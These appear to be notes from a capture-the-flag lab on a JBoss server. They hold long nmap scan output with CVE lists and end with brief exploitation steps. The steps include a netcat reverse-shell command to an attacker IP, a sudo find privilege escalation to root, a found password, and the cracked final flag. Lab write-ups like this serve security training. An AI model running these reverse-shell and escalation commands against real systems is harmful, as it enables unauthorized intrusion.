IP:10.10.143.180

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.6.1p1: 
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563
80/tcp   open  http        syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /page/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.143.180:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|_    http://10.10.143.180:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
1090/tcp open  java-rmi    syn-ack Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
1091/tcp open  java-rmi    syn-ack Java RMI
1098/tcp open  java-rmi    syn-ack Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
1099/tcp open  java-object syn-ack Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
|_rmi-vuln-classloader: ERROR: Script execution failed (use -d to debug)
4446/tcp open  java-object syn-ack Java Object Serialization
4712/tcp open  msdtc       syn-ack Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    126a
5500/tcp open  hotline?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   DNSVersionBindReqTCP, TerminalServerCookie: 
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   GenericLines, NULL: 
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   GetRequest: 
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     thm-java-deserial
|   HTTPOptions: 
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   Help: 
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     thm-java-deserial
|   Kerberos: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   RPCCheck: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   RTSPRequest: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   SSLSessionReq: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   TLSSessionReq: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|_    thm-java-deserial
5501/tcp open  tcpwrapped  syn-ack
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
8080/tcp open  http        syn-ack Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags: 
|   /jmx-console/: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin-console/: 
|     JSESSIONID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.143.180
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/admin-console/login.seam;jsessionid=AA379C37874FB8E40CBDC1450ECBC2E3?conversationId=5
|     Form id: login_form
|     Form action: /admin-console/login.seam;jsessionid=B4AA6528D3C8AC4192F12FCEF9EBE62A
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=com.sun.management
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.classloader
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.xnio
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.pojo
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=hornetq
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.j2ee
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=org.hornetq
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.threads
|     Form id: applyfilter
|     Form action: HtmlAdaptor?action=displayMBeans
|     
|     Path: http://10.10.143.180:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.system
|     Form id: applyfilter
|_    Form action: HtmlAdaptor?action=displayMBeans
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /invoker/JMXInvokerServlet: JBoss Console
|   /jmx-console/: JBoss Console
|_  /admin-console/: JBoss Console
|_http-iis-webdav-vuln: WebDAV is DISABLED. Server is not currently vulnerable.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 10
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
8083/tcp open  http        syn-ack JBoss service httpd
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Page: /index.php was not found. Try with an existing file.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.91%I=7%D=11/20%Time=637A09C5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xpO\xe5u\xcaur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0
SF:\0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~
SF:\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server
SF:\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\
SF:.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.serv
SF:er\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\
SF:0\x16thm-java-deserial\.home\0\0\x04J\xe39\x12\xed\x88\xbc\xde\xc22\xde
SF:\xc7\xd1\0\0\x01\x84\x94\xc2\xfe\xda\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.91%I=7%D=11/20%Time=637A09CB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.91%I=7%D=11/20%Time=637A09CB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(H
SF:TTPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")
SF:%r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r
SF:(Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,
SF:"126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgN
SF:eg,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r
SF:(LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126
SF:a\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServe
SF:r,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126
SF:a\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n")%r(ms-sql-s,5,"1
SF:26a\n")%r(afp,5,"126a\n")%r(giop,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.91%I=7%D=11/20%Time=637A09CB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GS
SF:SAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x11thm-java-deseri
SF:al")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0
SF:\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x1
SF:1thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x
SF:03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x01\x0
SF:6GSSAPI\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\
SF:x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\n
SF:DIGEST-MD5\x01\x04NTLM\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\
SF:0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06G
SF:SSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RPCC
SF:heck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIG
SF:EST-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deser
SF:ial")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01
SF:\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\
SF:x06GSSAPI\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G
SF:\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRA
SF:M-MD5\x01\x04NTLM\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(SSLSessi
SF:onReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06
SF:GSSAPI\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-dese
SF:rial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x
SF:03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04N
SF:TLM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDI
SF:GEST-MD5\x01\x04NTLM\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-M
SF:D5\x01\x06GSSAPI\x01\nDIGEST-MD5\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows


donwload zip and extract

python exploit.py IP:PORT "nc -e /bin/bash 10.8.29.89 4444"
catch it : rlwrap nc -lvnp 4444


Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

switch to jboss user
sudo -l : can run find
sudo find . -exec /bin/sh \; -quit to get root shell

cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

this is base 64, so let's decode it:BC77AC072EE30E3760806864E234C7CF

crack the hash using crackstation: zxcvbnm123456789

this is the final flag.
